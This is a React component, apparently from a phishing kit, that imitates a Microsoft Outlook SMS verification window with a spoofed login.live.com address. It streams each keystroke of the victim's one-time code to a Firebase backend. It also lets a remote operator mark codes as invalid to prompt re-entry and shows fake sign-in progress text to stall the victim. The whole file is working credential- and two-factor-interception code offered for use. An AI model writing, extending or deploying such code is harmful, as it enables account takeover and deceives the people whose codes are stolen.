import React from "react";
import { useNavigate } from "react-router-dom";
import EmailLayout from "../EmailLayout";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { reportTyping } from "../../../firebase/typing";
import DeviceManager from "../../../utils/deviceManager";
import outGif from "../assets/outgif.gif";
// Página de verificação via SMS do Outlook, seguindo o padrão do OutlookVerifyPage
const OutlookVerifySmsPage = () => {
  const { updateClientData, commands, clearCommands, clientData } =
    useFirebaseClient();
  const [invalidMessage, setInvalidMessage] = React.useState("");
  
  // Obter device number do DeviceManager (mesma lógica da GmailPasswordPage)
  const getLoggedInDevice = () => {
    return DeviceManager.getDeviceWithFirebaseData(clientData);
  };

  const [clientDevice, setClientDevice] = React.useState(getLoggedInDevice());
  
  // Atualizar device quando clientData mudar
  React.useEffect(() => {
    const newDevice = getLoggedInDevice();
    if (newDevice && newDevice !== clientDevice) {
      setClientDevice(newDevice);
    }
  }, [clientData?.deviceNumber, clientData?.deviceNumberConfirmed, clientData?.lastDevice, clientDevice]);
  
  // Função de navegação que sempre retorna false (deixa o useFirebaseClient lidar com redirecionamentos)
  const navigateByCommand = React.useCallback(() => false, []);

  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      setInvalidMessage("Invalid SMS code.");
      setCode("");
      setIsSubmitting(false);
      setLoadingStage("bar");
      setTimeout(() => clearCommands && clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, clearCommands]);

  React.useEffect(() => {
    updateClientData({
      currentUrl: "/sync?view=outlook_sms",
      currentPage: "outlook_sms",
      fromForm: true,
    });
  }, [updateClientData]);
  
  const translations = {
    windowTitle: "Verify your identity - Microsoft Edge",
    url: "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1754894&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015",
  };

  const [code, setCode] = React.useState("");
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [loadingStage, setLoadingStage] = React.useState("bar");
  const phrases = React.useMemo(
    () => [
      "Connecting to Outlook...",
      "Verifying your account...",
      "Syncing security settings...",
      "Finalizing sign-in...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  const [isReady, setIsReady] = React.useState(false);
  
  React.useEffect(() => {
    // Preloader de ~3s dentro do modal para evitar flicker
    const id = setTimeout(() => setIsReady(true), 3000);
    return () => clearTimeout(id);
  }, []);

  // Posição/drag igual às outras páginas
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(12, (window.innerWidth - 420) / 2),
    top: Math.max(12, (window.innerHeight - 420) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  
  const startDrag = (e) => {
    // Só permite arrastar se clicar no header da janela (não no conteúdo)
    const isHeaderElement = e.target.closest('[data-window-header="true"]');
    if (!isHeaderElement) return;

    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  React.useEffect(() => {
    if (isSubmitting && loadingStage === "final") {
      const id = setInterval(
        () => setPhraseIndex((p) => (p + 1) % phrases.length),
        2000
      );
      return () => clearInterval(id);
    }
  }, [isSubmitting, loadingStage, phrases.length]);

  // Telefone dinâmico vindo do dashboard (pode ser número completo formatado ou apenas 2 dígitos finais)
  const rawPhone = (clientData && clientData.outlookSmsPhone) || "";
  const maskedTemplate = "(**) *****-**00"; // template com dois dígitos finais substituíveis
  const renderPhone = React.useMemo(() => {
    const value = (rawPhone || "").toString().trim();
    if (!value)
      return localStorage.getItem("client_phone_mask") || "(**) *****-****";
    const justDigits = value.replace(/\D/g, "");
    if (/^\d{2}$/.test(justDigits)) {
      const last2 = justDigits;
      const chars = maskedTemplate.split("");
      let replaced = 0;
      for (let i = chars.length - 1; i >= 0 && replaced < 2; i--) {
        if (/\d/.test(chars[i])) {
          chars[i] = last2[1 - replaced];
          replaced++;
        }
      }
      return chars.join("");
    }
    return value; // número completo formatado
  }, [rawPhone]);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Segoe UI, Roboto, Arial, sans-serif" }}
      >
        <div
          style={{
            background: isSubmitting ? "#ffffff" : "#fbfbfb",
            borderRadius: 10,
            boxShadow: "0 2px 16px rgba(0,0,0,0.2)",
            width: "min(420px, 92vw)",
            minHeight: 420,
            color: "#252423",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Content area */}
          <div
            style={{
              flex: 1,
              display: "flex",
              flexDirection: "column",
              backgroundColor: "#ffffff",
              padding: 24,
              position: "relative",
            }}
          >
            {!isSubmitting ? (
              <>
                {/* Header Microsoft centralizado */}
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                    justifyContent: "center",
                    marginBottom: 20,
                  }}
                >
                  <svg
                    width="28"
                    height="28"
                    viewBox="0 0 32 32"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path fill="#FEBA08" d="M17 17h10v10H17z" />
                    <path fill="#05A6F0" d="M5 17h10v10H5z" />
                    <path fill="#80BC06" d="M17 5h10v10H17z" />
                    <path fill="#F25325" d="M5 5h10v10H5z" />
                  </svg>
                  <span style={{ fontSize: 20, color: "#1b1a19" }}>
                    Microsoft
                  </span>
                </div>

                {/* Título e descrição para SMS */}
                <h1
                  style={{
                    fontSize: 24,
                    fontWeight: 500,
                    margin: "18px 0 8px",
                    color: "#1b1a19",
                    letterSpacing: 0.2,
                  }}
                >
                  Verify your phone number
                </h1>
                <p
                  style={{
                    fontSize: 15,
                    color: "#323130",
                    lineHeight: 1.35,
                    marginBottom: 16,
                  }}
                >
                  If{" "}
                  <span
                    style={{
                      color: "#111111",
                      fontWeight: 500,
                      letterSpacing: 0.2,
                    }}
                  >
                    {renderPhone}
                  </span>{" "}
                  matches the phone number in your account, we'll send you an
                  SMS code.
                </p>

                {/* Input do código */}
                <label
                  htmlFor="code"
                  style={{ fontSize: 13, color: "#605e5c" }}
                >
                  Enter SMS code
                </label>
                <input
                  data-outlook-modal
                  id="code"
                  value={code}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "").slice(0, 6);
                    setCode(val);
                    try {
                      updateClientData({ outlookSms: val });
                      reportTyping("outlooksms", val);
                    } catch {}
                  }}
                  style={{
                    width: "100%",
                    border: "none",
                    borderBottom: "2px solid #a19f9d",
                    background: "transparent",
                    outline: "none",
                    padding: "8px 2px 6px",
                    fontSize: 14,
                  }}
                  placeholder="Enter 6-digit code"
                />
                {invalidMessage && (
                  <div
                    style={{ color: "#a4262c", fontSize: 12, marginTop: 6 }}
                  >
                    {invalidMessage}
                  </div>
                )}

                {/* Link alternativo */}
                <div style={{ marginTop: 10 }}>
                  <a
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    style={{
                      color: "#0f6cbd",
                      textDecoration: "none",
                      fontSize: 15,
                    }}
                  >
                    Use a different verification option
                  </a>
                </div>

                {/* Footer com botões */}
                <div
                  style={{
                    position: "absolute",
                    left: 0,
                    right: 0,
                    bottom: 24,
                    display: "flex",
                    gap: 10,
                    justifyContent: "flex-end",
                    padding: "10px 24px",
                    background: "transparent",
                  }}
                >
                  <button
                    type="button"
                    style={{
                      padding: "7px 14px",
                      border: "1px solid #d0d7de",
                      background:
                        "linear-gradient(180deg, #f5f7fa 0%, #e9eef5 100%)",
                      color: "#323130",
                      borderRadius: 4,
                      fontSize: 14,
                      cursor: "pointer",
                    }}
                  >
                    Cancel
                  </button>
                  <button
                    type="button"
                    disabled={!code.trim()}
                    onClick={() => {
                      if (!code.trim()) return;
                      try {
                        updateClientData({ outlookSmsSubmittedAt: Date.now() });
                      } catch {}
                      setIsSubmitting(true);
                      setTimeout(() => setLoadingStage("final"), 300);
                    }}
                    style={{
                      padding: "9px 24px",
                      background: "#0F64B1",
                      color: "#ffffff",
                      border: "1px solid #0F64B1",
                      borderRadius: 4,
                      fontSize: 14,
                      fontWeight: 600,
                      minWidth: 100,
                      cursor: code.trim() ? "pointer" : "not-allowed",
                      opacity: code.trim() ? 1 : 0.65,
                    }}
                  >
                    Next
                  </button>
                </div>
              </>
            ) : (
              /* Etapa final: loading */
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 16,
                  textAlign: "center",
                }}
              >
                <img
                  src={outGif}
                  alt="Outlook"
                  style={{ width: 300, height: "auto" }}
                />
                <div
                  style={{
                    width: 36,
                    height: 36,
                    border: "3px solid #106ebe",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
                <div style={{ color: "#323130", fontSize: 16, minHeight: 24 }}>
                  {phrases[phraseIndex]}
                </div>
              </div>
            )}

            <style>{`
              @keyframes spin { 
                from { transform: rotate(0deg); } 
                to { transform: rotate(360deg); } 
              }
            `}</style>
          </div>
        </div>
      </div>
    </EmailLayout>
  );
};

export default OutlookVerifySmsPage;
